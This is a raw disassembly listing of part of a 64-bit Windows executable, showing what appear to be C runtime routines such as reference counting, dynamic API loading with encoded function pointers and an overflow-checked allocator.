   140008735:	48 8d 05 a4 70 00 00 	lea    0x70a4(%rip),%rax        # 0x14000f7e0
   14000873c:	48 3b c8             	cmp    %rax,%rcx
   14000873f:	74 10                	je     0x140008751
   140008741:	b8 01 00 00 00       	mov    $0x1,%eax
   140008746:	f0 0f c1 81 5c 01 00 	lock xadd %eax,0x15c(%rcx)
   14000874d:	00 
   14000874e:	ff c0                	inc    %eax
   140008750:	c3                   	ret
   140008751:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
   140008756:	c3                   	ret
   140008757:	cc                   	int3
   140008758:	48 85 c9             	test   %rcx,%rcx
   14000875b:	74 30                	je     0x14000878d
   14000875d:	53                   	push   %rbx
   14000875e:	48 83 ec 20          	sub    $0x20,%rsp
   140008762:	48 8d 05 77 70 00 00 	lea    0x7077(%rip),%rax        # 0x14000f7e0
   140008769:	48 8b d9             	mov    %rcx,%rbx
   14000876c:	48 3b c8             	cmp    %rax,%rcx
   14000876f:	74 17                	je     0x140008788
   140008771:	8b 81 5c 01 00 00    	mov    0x15c(%rcx),%eax
   140008777:	85 c0                	test   %eax,%eax
   140008779:	75 0d                	jne    0x140008788
   14000877b:	e8 74 fa ff ff       	call   0x1400081f4
   140008780:	48 8b cb             	mov    %rbx,%rcx
   140008783:	e8 a4 de ff ff       	call   0x14000662c
   140008788:	48 83 c4 20          	add    $0x20,%rsp
   14000878c:	5b                   	pop    %rbx
   14000878d:	c3                   	ret
   14000878e:	cc                   	int3
   14000878f:	cc                   	int3
   140008790:	48 85 c9             	test   %rcx,%rcx
   140008793:	74 1a                	je     0x1400087af
   140008795:	48 8d 05 44 70 00 00 	lea    0x7044(%rip),%rax        # 0x14000f7e0
   14000879c:	48 3b c8             	cmp    %rax,%rcx
   14000879f:	74 0e                	je     0x1400087af
   1400087a1:	83 c8 ff             	or     $0xffffffff,%eax
   1400087a4:	f0 0f c1 81 5c 01 00 	lock xadd %eax,0x15c(%rcx)
   1400087ab:	00 
   1400087ac:	ff c8                	dec    %eax
   1400087ae:	c3                   	ret
   1400087af:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
   1400087b4:	c3                   	ret
   1400087b5:	cc                   	int3
   1400087b6:	cc                   	int3
   1400087b7:	cc                   	int3
   1400087b8:	48 83 ec 28          	sub    $0x28,%rsp
   1400087bc:	48 85 c9             	test   %rcx,%rcx
   1400087bf:	0f 84 96 00 00 00    	je     0x14000885b
   1400087c5:	41 83 c9 ff          	or     $0xffffffff,%r9d
   1400087c9:	f0 44 01 49 10       	lock add %r9d,0x10(%rcx)
   1400087ce:	48 8b 81 e0 00 00 00 	mov    0xe0(%rcx),%rax
   1400087d5:	48 85 c0             	test   %rax,%rax
   1400087d8:	74 04                	je     0x1400087de
   1400087da:	f0 44 01 08          	lock add %r9d,(%rax)
   1400087de:	48 8b 81 f0 00 00 00 	mov    0xf0(%rcx),%rax
   1400087e5:	48 85 c0             	test   %rax,%rax
   1400087e8:	74 04                	je     0x1400087ee
   1400087ea:	f0 44 01 08          	lock add %r9d,(%rax)
   1400087ee:	48 8b 81 e8 00 00 00 	mov    0xe8(%rcx),%rax
   1400087f5:	48 85 c0             	test   %rax,%rax
   1400087f8:	74 04                	je     0x1400087fe
   1400087fa:	f0 44 01 08          	lock add %r9d,(%rax)
   1400087fe:	48 8b 81 00 01 00 00 	mov    0x100(%rcx),%rax
   140008805:	48 85 c0             	test   %rax,%rax
   140008808:	74 04                	je     0x14000880e
   14000880a:	f0 44 01 08          	lock add %r9d,(%rax)
   14000880e:	48 8d 41 38          	lea    0x38(%rcx),%rax
   140008812:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   140008818:	48 8d 15 49 ff 00 00 	lea    0xff49(%rip),%rdx        # 0x140018768
   14000881f:	48 39 50 f0          	cmp    %rdx,-0x10(%rax)
   140008823:	74 0c                	je     0x140008831
   140008825:	48 8b 10             	mov    (%rax),%rdx
   140008828:	48 85 d2             	test   %rdx,%rdx
   14000882b:	74 04                	je     0x140008831
   14000882d:	f0 44 01 0a          	lock add %r9d,(%rdx)
   140008831:	48 83 78 e8 00       	cmpq   $0x0,-0x18(%rax)
   140008836:	74 0d                	je     0x140008845
   140008838:	48 8b 50 f8          	mov    -0x8(%rax),%rdx
   14000883c:	48 85 d2             	test   %rdx,%rdx
   14000883f:	74 04                	je     0x140008845
   140008841:	f0 44 01 0a          	lock add %r9d,(%rdx)
   140008845:	48 83 c0 20          	add    $0x20,%rax
   140008849:	49 83 e8 01          	sub    $0x1,%r8
   14000884d:	75 c9                	jne    0x140008818
   14000884f:	48 8b 89 20 01 00 00 	mov    0x120(%rcx),%rcx
   140008856:	e8 35 ff ff ff       	call   0x140008790
   14000885b:	48 83 c4 28          	add    $0x28,%rsp
   14000885f:	c3                   	ret
   140008860:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008865:	57                   	push   %rdi
   140008866:	48 83 ec 20          	sub    $0x20,%rsp
   14000886a:	e8 e5 d3 ff ff       	call   0x140005c54
   14000886f:	48 8d b8 90 00 00 00 	lea    0x90(%rax),%rdi
   140008876:	8b 88 a8 03 00 00    	mov    0x3a8(%rax),%ecx
   14000887c:	8b 05 8e ff 00 00    	mov    0xff8e(%rip),%eax        # 0x140018810
   140008882:	85 c8                	test   %ecx,%eax
   140008884:	74 08                	je     0x14000888e
   140008886:	48 8b 1f             	mov    (%rdi),%rbx
   140008889:	48 85 db             	test   %rbx,%rbx
   14000888c:	75 2c                	jne    0x1400088ba
   14000888e:	b9 04 00 00 00       	mov    $0x4,%ecx
   140008893:	e8 50 f1 ff ff       	call   0x1400079e8
   140008898:	90                   	nop
   140008899:	48 8b 15 58 0d 01 00 	mov    0x10d58(%rip),%rdx        # 0x1400195f8
   1400088a0:	48 8b cf             	mov    %rdi,%rcx
   1400088a3:	e8 28 00 00 00       	call   0x1400088d0
   1400088a8:	48 8b d8             	mov    %rax,%rbx
   1400088ab:	b9 04 00 00 00       	mov    $0x4,%ecx
   1400088b0:	e8 87 f1 ff ff       	call   0x140007a3c
   1400088b5:	48 85 db             	test   %rbx,%rbx
   1400088b8:	74 0e                	je     0x1400088c8
   1400088ba:	48 8b c3             	mov    %rbx,%rax
   1400088bd:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400088c2:	48 83 c4 20          	add    $0x20,%rsp
   1400088c6:	5f                   	pop    %rdi
   1400088c7:	c3                   	ret
   1400088c8:	e8 fb cd ff ff       	call   0x1400056c8
   1400088cd:	90                   	nop
   1400088ce:	cc                   	int3
   1400088cf:	cc                   	int3
   1400088d0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400088d5:	57                   	push   %rdi
   1400088d6:	48 83 ec 20          	sub    $0x20,%rsp
   1400088da:	48 8b fa             	mov    %rdx,%rdi
   1400088dd:	48 85 d2             	test   %rdx,%rdx
   1400088e0:	74 46                	je     0x140008928
   1400088e2:	48 85 c9             	test   %rcx,%rcx
   1400088e5:	74 41                	je     0x140008928
   1400088e7:	48 8b 19             	mov    (%rcx),%rbx
   1400088ea:	48 3b da             	cmp    %rdx,%rbx
   1400088ed:	75 05                	jne    0x1400088f4
   1400088ef:	48 8b c7             	mov    %rdi,%rax
   1400088f2:	eb 36                	jmp    0x14000892a
   1400088f4:	48 89 39             	mov    %rdi,(%rcx)
   1400088f7:	48 8b cf             	mov    %rdi,%rcx
   1400088fa:	e8 2d fc ff ff       	call   0x14000852c
   1400088ff:	48 85 db             	test   %rbx,%rbx
   140008902:	74 eb                	je     0x1400088ef
   140008904:	48 8b cb             	mov    %rbx,%rcx
   140008907:	e8 ac fe ff ff       	call   0x1400087b8
   14000890c:	83 7b 10 00          	cmpl   $0x0,0x10(%rbx)
   140008910:	75 dd                	jne    0x1400088ef
   140008912:	48 8d 05 e7 fc 00 00 	lea    0xfce7(%rip),%rax        # 0x140018600
   140008919:	48 3b d8             	cmp    %rax,%rbx
   14000891c:	74 d1                	je     0x1400088ef
   14000891e:	48 8b cb             	mov    %rbx,%rcx
   140008921:	e8 92 fc ff ff       	call   0x1400085b8
   140008926:	eb c7                	jmp    0x1400088ef
   140008928:	33 c0                	xor    %eax,%eax
   14000892a:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000892f:	48 83 c4 20          	add    $0x20,%rsp
   140008933:	5f                   	pop    %rdi
   140008934:	c3                   	ret
   140008935:	cc                   	int3
   140008936:	cc                   	int3
   140008937:	cc                   	int3
   140008938:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000893d:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140008942:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140008947:	57                   	push   %rdi
   140008948:	41 54                	push   %r12
   14000894a:	41 55                	push   %r13
   14000894c:	41 56                	push   %r14
   14000894e:	41 57                	push   %r15
   140008950:	48 83 ec 20          	sub    $0x20,%rsp
   140008954:	44 8b f9             	mov    %ecx,%r15d
   140008957:	4c 8d 35 a2 76 ff ff 	lea    -0x895e(%rip),%r14        # 0x140000000
   14000895e:	4d 8b e1             	mov    %r9,%r12
   140008961:	49 8b e8             	mov    %r8,%rbp
   140008964:	4c 8b ea             	mov    %rdx,%r13
   140008967:	4b 8b 8c fe a0 96 01 	mov    0x196a0(%r14,%r15,8),%rcx
   14000896e:	00 
   14000896f:	4c 8b 05 ca f6 00 00 	mov    0xf6ca(%rip),%r8        # 0x140018040
   140008976:	48 83 cf ff          	or     $0xffffffffffffffff,%rdi
   14000897a:	41 8b c0             	mov    %r8d,%eax
   14000897d:	49 8b d0             	mov    %r8,%rdx
   140008980:	48 33 d1             	xor    %rcx,%rdx
   140008983:	83 e0 3f             	and    $0x3f,%eax
   140008986:	8a c8                	mov    %al,%cl
   140008988:	48 d3 ca             	ror    %cl,%rdx
   14000898b:	48 3b d7             	cmp    %rdi,%rdx
   14000898e:	0f 84 ea 00 00 00    	je     0x140008a7e
   140008994:	48 85 d2             	test   %rdx,%rdx
   140008997:	74 08                	je     0x1400089a1
   140008999:	48 8b c2             	mov    %rdx,%rax
   14000899c:	e9 df 00 00 00       	jmp    0x140008a80
   1400089a1:	49 3b ec             	cmp    %r12,%rbp
   1400089a4:	0f 84 b9 00 00 00    	je     0x140008a63
   1400089aa:	8b 75 00             	mov    0x0(%rbp),%esi
   1400089ad:	49 8b 9c f6 00 96 01 	mov    0x19600(%r14,%rsi,8),%rbx
   1400089b4:	00 
   1400089b5:	48 85 db             	test   %rbx,%rbx
   1400089b8:	74 0e                	je     0x1400089c8
   1400089ba:	48 3b df             	cmp    %rdi,%rbx
   1400089bd:	0f 85 fa 00 00 00    	jne    0x140008abd
   1400089c3:	e9 87 00 00 00       	jmp    0x140008a4f
   1400089c8:	4d 8b b4 f6 70 04 01 	mov    0x10470(%r14,%rsi,8),%r14
   1400089cf:	00 
   1400089d0:	33 d2                	xor    %edx,%edx
   1400089d2:	49 8b ce             	mov    %r14,%rcx
   1400089d5:	41 b8 00 08 00 00    	mov    $0x800,%r8d
   1400089db:	ff 15 0f 57 00 00    	call   *0x570f(%rip)        # 0x14000e0f0
   1400089e1:	48 8b d8             	mov    %rax,%rbx
   1400089e4:	48 85 c0             	test   %rax,%rax
   1400089e7:	0f 85 b0 00 00 00    	jne    0x140008a9d
   1400089ed:	ff 15 9d 56 00 00    	call   *0x569d(%rip)        # 0x14000e090
   1400089f3:	83 f8 57             	cmp    $0x57,%eax
   1400089f6:	75 45                	jne    0x140008a3d
   1400089f8:	8d 58 b0             	lea    -0x50(%rax),%ebx
   1400089fb:	49 8b ce             	mov    %r14,%rcx
   1400089fe:	44 8b c3             	mov    %ebx,%r8d
   140008a01:	48 8d 15 e0 67 00 00 	lea    0x67e0(%rip),%rdx        # 0x14000f1e8
   140008a08:	e8 a3 ce ff ff       	call   0x1400058b0
   140008a0d:	85 c0                	test   %eax,%eax
   140008a0f:	74 2c                	je     0x140008a3d
   140008a11:	44 8b c3             	mov    %ebx,%r8d
   140008a14:	48 8d 15 4d 7f 00 00 	lea    0x7f4d(%rip),%rdx        # 0x140010968
   140008a1b:	49 8b ce             	mov    %r14,%rcx
   140008a1e:	e8 8d ce ff ff       	call   0x1400058b0
   140008a23:	85 c0                	test   %eax,%eax
   140008a25:	74 16                	je     0x140008a3d
   140008a27:	45 33 c0             	xor    %r8d,%r8d
   140008a2a:	33 d2                	xor    %edx,%edx
   140008a2c:	49 8b ce             	mov    %r14,%rcx
   140008a2f:	ff 15 bb 56 00 00    	call   *0x56bb(%rip)        # 0x14000e0f0
   140008a35:	48 8b d8             	mov    %rax,%rbx
   140008a38:	48 85 c0             	test   %rax,%rax
   140008a3b:	75 60                	jne    0x140008a9d
   140008a3d:	48 8b c7             	mov    %rdi,%rax
   140008a40:	4c 8d 35 b9 75 ff ff 	lea    -0x8a47(%rip),%r14        # 0x140000000
   140008a47:	49 87 84 f6 00 96 01 	xchg   %rax,0x19600(%r14,%rsi,8)
   140008a4e:	00 
   140008a4f:	48 83 c5 04          	add    $0x4,%rbp
   140008a53:	49 3b ec             	cmp    %r12,%rbp
   140008a56:	0f 85 4e ff ff ff    	jne    0x1400089aa
   140008a5c:	4c 8b 05 dd f5 00 00 	mov    0xf5dd(%rip),%r8        # 0x140018040
   140008a63:	41 8b c0             	mov    %r8d,%eax
   140008a66:	b9 40 00 00 00       	mov    $0x40,%ecx
   140008a6b:	83 e0 3f             	and    $0x3f,%eax
   140008a6e:	2b c8                	sub    %eax,%ecx
   140008a70:	48 d3 cf             	ror    %cl,%rdi
   140008a73:	49 33 f8             	xor    %r8,%rdi
   140008a76:	4b 87 bc fe a0 96 01 	xchg   %rdi,0x196a0(%r14,%r15,8)
   140008a7d:	00 
   140008a7e:	33 c0                	xor    %eax,%eax
   140008a80:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140008a85:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   140008a8a:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140008a8f:	48 83 c4 20          	add    $0x20,%rsp
   140008a93:	41 5f                	pop    %r15
   140008a95:	41 5e                	pop    %r14
   140008a97:	41 5d                	pop    %r13
   140008a99:	41 5c                	pop    %r12
   140008a9b:	5f                   	pop    %rdi
   140008a9c:	c3                   	ret
   140008a9d:	48 8b c3             	mov    %rbx,%rax
   140008aa0:	4c 8d 35 59 75 ff ff 	lea    -0x8aa7(%rip),%r14        # 0x140000000
   140008aa7:	49 87 84 f6 00 96 01 	xchg   %rax,0x19600(%r14,%rsi,8)
   140008aae:	00 
   140008aaf:	48 85 c0             	test   %rax,%rax
   140008ab2:	74 09                	je     0x140008abd
   140008ab4:	48 8b cb             	mov    %rbx,%rcx
   140008ab7:	ff 15 23 56 00 00    	call   *0x5623(%rip)        # 0x14000e0e0
   140008abd:	49 8b d5             	mov    %r13,%rdx
   140008ac0:	48 8b cb             	mov    %rbx,%rcx
   140008ac3:	ff 15 1f 56 00 00    	call   *0x561f(%rip)        # 0x14000e0e8
   140008ac9:	48 85 c0             	test   %rax,%rax
   140008acc:	74 8e                	je     0x140008a5c
   140008ace:	4c 8b 05 6b f5 00 00 	mov    0xf56b(%rip),%r8        # 0x140018040
   140008ad5:	ba 40 00 00 00       	mov    $0x40,%edx
   140008ada:	41 8b c8             	mov    %r8d,%ecx
   140008add:	83 e1 3f             	and    $0x3f,%ecx
   140008ae0:	2b d1                	sub    %ecx,%edx
   140008ae2:	8a ca                	mov    %dl,%cl
   140008ae4:	48 8b d0             	mov    %rax,%rdx
   140008ae7:	48 d3 ca             	ror    %cl,%rdx
   140008aea:	49 33 d0             	xor    %r8,%rdx
   140008aed:	4b 87 94 fe a0 96 01 	xchg   %rdx,0x196a0(%r14,%r15,8)
   140008af4:	00 
   140008af5:	eb 89                	jmp    0x140008a80
   140008af7:	cc                   	int3
   140008af8:	40 53                	rex push %rbx
   140008afa:	48 83 ec 20          	sub    $0x20,%rsp
   140008afe:	48 8b d9             	mov    %rcx,%rbx
   140008b01:	4c 8d 0d b0 7e 00 00 	lea    0x7eb0(%rip),%r9        # 0x1400109b8
   140008b08:	b9 18 00 00 00       	mov    $0x18,%ecx
   140008b0d:	4c 8d 05 a0 7e 00 00 	lea    0x7ea0(%rip),%r8        # 0x1400109b4
   140008b14:	48 8d 15 9d 7e 00 00 	lea    0x7e9d(%rip),%rdx        # 0x1400109b8
   140008b1b:	e8 18 fe ff ff       	call   0x140008938
   140008b20:	48 85 c0             	test   %rax,%rax
   140008b23:	74 20                	je     0x140008b45
   140008b25:	49 ba 70 c0 d1 34 da 	movabs $0xbdc017da34d1c070,%r10
   140008b2c:	17 c0 bd 
   140008b2f:	48 8b d3             	mov    %rbx,%rdx
   140008b32:	48 c7 c1 fa ff ff ff 	mov    $0xfffffffffffffffa,%rcx
   140008b39:	48 83 c4 20          	add    $0x20,%rsp
   140008b3d:	5b                   	pop    %rbx
   140008b3e:	48 ff 25 23 57 00 00 	rex.W jmp *0x5723(%rip)        # 0x14000e268
   140008b45:	b8 25 02 00 c0       	mov    $0xc0000225,%eax
   140008b4a:	48 83 c4 20          	add    $0x20,%rsp
   140008b4e:	5b                   	pop    %rbx
   140008b4f:	c3                   	ret
   140008b50:	48 ff 25 79 56 00 00 	rex.W jmp *0x5679(%rip)        # 0x14000e1d0
   140008b57:	cc                   	int3
   140008b58:	48 ff 25 89 56 00 00 	rex.W jmp *0x5689(%rip)        # 0x14000e1e8
   140008b5f:	cc                   	int3
   140008b60:	48 ff 25 71 56 00 00 	rex.W jmp *0x5671(%rip)        # 0x14000e1d8
   140008b67:	cc                   	int3
   140008b68:	48 ff 25 71 56 00 00 	rex.W jmp *0x5671(%rip)        # 0x14000e1e0
   140008b6f:	cc                   	int3
   140008b70:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008b75:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140008b7a:	57                   	push   %rdi
   140008b7b:	48 83 ec 20          	sub    $0x20,%rsp
   140008b7f:	41 8b f0             	mov    %r8d,%esi
   140008b82:	4c 8d 0d f7 7d 00 00 	lea    0x7df7(%rip),%r9        # 0x140010980
   140008b89:	8b da                	mov    %edx,%ebx
   140008b8b:	4c 8d 05 e6 7d 00 00 	lea    0x7de6(%rip),%r8        # 0x140010978
   140008b92:	48 8b f9             	mov    %rcx,%rdi
   140008b95:	48 8d 15 bc 66 00 00 	lea    0x66bc(%rip),%rdx        # 0x14000f258
   140008b9c:	b9 0e 00 00 00       	mov    $0xe,%ecx
   140008ba1:	e8 92 fd ff ff       	call   0x140008938
   140008ba6:	48 85 c0             	test   %rax,%rax
   140008ba9:	74 1a                	je     0x140008bc5
   140008bab:	49 ba 70 da d2 32 50 	movabs $0x82a03e5032d2da70,%r10
   140008bb2:	3e a0 82 
   140008bb5:	44 8b c6             	mov    %esi,%r8d
   140008bb8:	8b d3                	mov    %ebx,%edx
   140008bba:	48 8b cf             	mov    %rdi,%rcx
   140008bbd:	ff 15 a5 56 00 00    	call   *0x56a5(%rip)        # 0x14000e268
   140008bc3:	eb 0b                	jmp    0x140008bd0
   140008bc5:	8b d3                	mov    %ebx,%edx
   140008bc7:	48 8b cf             	mov    %rdi,%rcx
   140008bca:	ff 15 e8 54 00 00    	call   *0x54e8(%rip)        # 0x14000e0b8
   140008bd0:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140008bd5:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140008bda:	48 83 c4 20          	add    $0x20,%rsp
   140008bde:	5f                   	pop    %rdi
   140008bdf:	c3                   	ret
   140008be0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008be5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140008bea:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140008bef:	57                   	push   %rdi
   140008bf0:	48 83 ec 50          	sub    $0x50,%rsp
   140008bf4:	41 8b d9             	mov    %r9d,%ebx
   140008bf7:	49 8b f8             	mov    %r8,%rdi
   140008bfa:	8b f2                	mov    %edx,%esi
   140008bfc:	4c 8d 0d 85 7d 00 00 	lea    0x7d85(%rip),%r9        # 0x140010988
   140008c03:	48 8b e9             	mov    %rcx,%rbp
   140008c06:	4c 8d 05 73 7d 00 00 	lea    0x7d73(%rip),%r8        # 0x140010980
   140008c0d:	48 8d 15 74 7d 00 00 	lea    0x7d74(%rip),%rdx        # 0x140010988
   140008c14:	b9 10 00 00 00       	mov    $0x10,%ecx
   140008c19:	e8 1a fd ff ff       	call   0x140008938
   140008c1e:	4c 8b d8             	mov    %rax,%r11
   140008c21:	48 85 c0             	test   %rax,%rax
   140008c24:	74 5f                	je     0x140008c85
   140008c26:	49 ba 70 e2 57 50 62 	movabs $0xe3a11f625057e270,%r10
   140008c2d:	1f a1 e3 
   140008c30:	48 8b 94 24 a0 00 00 	mov    0xa0(%rsp),%rdx
   140008c37:	00 
   140008c38:	44 8b cb             	mov    %ebx,%r9d
   140008c3b:	48 8b 8c 24 98 00 00 	mov    0x98(%rsp),%rcx
   140008c42:	00 
   140008c43:	4c 8b c7             	mov    %rdi,%r8
   140008c46:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
   140008c4d:	00 
   140008c4e:	48 89 54 24 40       	mov    %rdx,0x40(%rsp)
   140008c53:	8b d6                	mov    %esi,%edx
   140008c55:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
   140008c5a:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
   140008c61:	00 
   140008c62:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140008c67:	8b 8c 24 88 00 00 00 	mov    0x88(%rsp),%ecx
   140008c6e:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   140008c72:	48 8b cd             	mov    %rbp,%rcx
   140008c75:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140008c7a:	49 8b c3             	mov    %r11,%rax
   140008c7d:	ff 15 e5 55 00 00    	call   *0x55e5(%rip)        # 0x14000e268
   140008c83:	eb 32                	jmp    0x140008cb7
   140008c85:	33 d2                	xor    %edx,%edx
   140008c87:	48 8b cd             	mov    %rbp,%rcx
   140008c8a:	e8 3d 00 00 00       	call   0x140008ccc
   140008c8f:	8b c8                	mov    %eax,%ecx
   140008c91:	44 8b cb             	mov    %ebx,%r9d
   140008c94:	8b 84 24 88 00 00 00 	mov    0x88(%rsp),%eax
   140008c9b:	4c 8b c7             	mov    %rdi,%r8
   140008c9e:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140008ca2:	8b d6                	mov    %esi,%edx
   140008ca4:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
   140008cab:	00 
   140008cac:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140008cb1:	ff 15 39 55 00 00    	call   *0x5539(%rip)        # 0x14000e1f0
   140008cb7:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140008cbc:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   140008cc1:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   140008cc6:	48 83 c4 50          	add    $0x50,%rsp
   140008cca:	5f                   	pop    %rdi
   140008ccb:	c3                   	ret
   140008ccc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008cd1:	57                   	push   %rdi
   140008cd2:	48 83 ec 20          	sub    $0x20,%rsp
   140008cd6:	8b fa                	mov    %edx,%edi
   140008cd8:	4c 8d 0d c1 7c 00 00 	lea    0x7cc1(%rip),%r9        # 0x1400109a0
   140008cdf:	48 8b d9             	mov    %rcx,%rbx
   140008ce2:	48 8d 15 b7 7c 00 00 	lea    0x7cb7(%rip),%rdx        # 0x1400109a0
   140008ce9:	b9 12 00 00 00       	mov    $0x12,%ecx
   140008cee:	4c 8d 05 a3 7c 00 00 	lea    0x7ca3(%rip),%r8        # 0x140010998
   140008cf5:	e8 3e fc ff ff       	call   0x140008938
   140008cfa:	48 85 c0             	test   %rax,%rax
   140008cfd:	74 17                	je     0x140008d16
   140008cff:	49 ba 70 32 d8 54 23 	movabs $0xeadd062354d83270,%r10
   140008d06:	06 dd ea 
   140008d09:	8b d7                	mov    %edi,%edx
   140008d0b:	48 8b cb             	mov    %rbx,%rcx
   140008d0e:	ff 15 54 55 00 00    	call   *0x5554(%rip)        # 0x14000e268
   140008d14:	eb 08                	jmp    0x140008d1e
   140008d16:	48 8b cb             	mov    %rbx,%rcx
   140008d19:	e8 2e 15 00 00       	call   0x14000a24c
   140008d1e:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140008d23:	48 83 c4 20          	add    $0x20,%rsp
   140008d27:	5f                   	pop    %rdi
   140008d28:	c3                   	ret
   140008d29:	cc                   	int3
   140008d2a:	cc                   	int3
   140008d2b:	cc                   	int3
   140008d2c:	48 89 7c 24 08       	mov    %rdi,0x8(%rsp)
   140008d31:	48 8d 3d 68 09 01 00 	lea    0x10968(%rip),%rdi        # 0x1400196a0
   140008d38:	48 8d 05 51 0a 01 00 	lea    0x10a51(%rip),%rax        # 0x140019790
   140008d3f:	48 3b c7             	cmp    %rdi,%rax
   140008d42:	48 8b 05 f7 f2 00 00 	mov    0xf2f7(%rip),%rax        # 0x140018040
   140008d49:	48 1b c9             	sbb    %rcx,%rcx
   140008d4c:	48 f7 d1             	not    %rcx
   140008d4f:	83 e1 1e             	and    $0x1e,%ecx
   140008d52:	f3 48 ab             	rep stos %rax,(%rdi)
   140008d55:	48 8b 7c 24 08       	mov    0x8(%rsp),%rdi
   140008d5a:	b0 01                	mov    $0x1,%al
   140008d5c:	c3                   	ret
   140008d5d:	cc                   	int3
   140008d5e:	cc                   	int3
   140008d5f:	cc                   	int3
   140008d60:	40 53                	rex push %rbx
   140008d62:	48 83 ec 20          	sub    $0x20,%rsp
   140008d66:	84 c9                	test   %cl,%cl
   140008d68:	75 2f                	jne    0x140008d99
   140008d6a:	48 8d 1d 8f 08 01 00 	lea    0x1088f(%rip),%rbx        # 0x140019600
   140008d71:	48 8b 0b             	mov    (%rbx),%rcx
   140008d74:	48 85 c9             	test   %rcx,%rcx
   140008d77:	74 10                	je     0x140008d89
   140008d79:	48 83 f9 ff          	cmp    $0xffffffffffffffff,%rcx
   140008d7d:	74 06                	je     0x140008d85
   140008d7f:	ff 15 5b 53 00 00    	call   *0x535b(%rip)        # 0x14000e0e0
   140008d85:	48 83 23 00          	andq   $0x0,(%rbx)
   140008d89:	48 83 c3 08          	add    $0x8,%rbx
   140008d8d:	48 8d 05 04 09 01 00 	lea    0x10904(%rip),%rax        # 0x140019698
   140008d94:	48 3b d8             	cmp    %rax,%rbx
   140008d97:	75 d8                	jne    0x140008d71
   140008d99:	b0 01                	mov    $0x1,%al
   140008d9b:	48 83 c4 20          	add    $0x20,%rsp
   140008d9f:	5b                   	pop    %rbx
   140008da0:	c3                   	ret
   140008da1:	cc                   	int3
   140008da2:	cc                   	int3
   140008da3:	cc                   	int3
   140008da4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008da9:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140008dae:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140008db3:	57                   	push   %rdi
   140008db4:	48 83 ec 20          	sub    $0x20,%rsp
   140008db8:	49 8b e8             	mov    %r8,%rbp
   140008dbb:	48 8b da             	mov    %rdx,%rbx
   140008dbe:	48 8b f1             	mov    %rcx,%rsi
   140008dc1:	48 85 d2             	test   %rdx,%rdx
   140008dc4:	74 1d                	je     0x140008de3
   140008dc6:	33 d2                	xor    %edx,%edx
   140008dc8:	48 8d 42 e0          	lea    -0x20(%rdx),%rax
   140008dcc:	48 f7 f3             	div    %rbx
   140008dcf:	49 3b c0             	cmp    %r8,%rax
   140008dd2:	73 0f                	jae    0x140008de3
   140008dd4:	e8 bb d7 ff ff       	call   0x140006594
   140008dd9:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   140008ddf:	33 c0                	xor    %eax,%eax
   140008de1:	eb 41                	jmp    0x140008e24
   140008de3:	48 85 f6             	test   %rsi,%rsi
   140008de6:	74 0a                	je     0x140008df2
   140008de8:	e8 07 15 00 00       	call   0x14000a2f4
   140008ded:	48 8b f8             	mov    %rax,%rdi
   140008df0:	eb 02                	jmp    0x140008df4
   140008df2:	33 ff                	xor    %edi,%edi
   140008df4:	48 0f af dd          	imul   %rbp,%rbx
   140008df8:	48 8b ce             	mov    %rsi,%rcx
   140008dfb:	48 8b d3             	mov    %rbx,%rdx
   140008dfe:	e8 2d 15 00 00       	call   0x14000a330
   140008e03:	48 8b f0             	mov    %rax,%rsi
   140008e06:	48 85 c0             	test   %rax,%rax
   140008e09:	74 16                	je     0x140008e21
   140008e0b:	48 3b fb             	cmp    %rbx,%rdi
   140008e0e:	73 11                	jae    0x140008e21
   140008e10:	48 2b df             	sub    %rdi,%rbx
   140008e13:	48 8d 0c 38          	lea    (%rax,%rdi,1),%rcx
   140008e17:	4c 8b c3             	mov    %rbx,%r8
   140008e1a:	33 d2                	xor    %edx,%edx
   140008e1c:	e8 0f 41 00 00       	call   0x14000cf30
   140008e21:	48 8b c6             	mov    %rsi,%rax
   140008e24:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140008e29:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140008e2e:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140008e33:	48 83 c4 20          	add    $0x20,%rsp
   140008e37:	5f                   	pop    %rdi
   140008e38:	c3                   	ret
   140008e39:	cc                   	int3
   140008e3a:	cc                   	int3
   140008e3b:	cc                   	int3
   140008e3c:	48 83 ec 28          	sub    $0x28,%rsp
   140008e40:	ff 15 b2 53 00 00    	call   *0x53b2(%rip)        # 0x14000e1f8
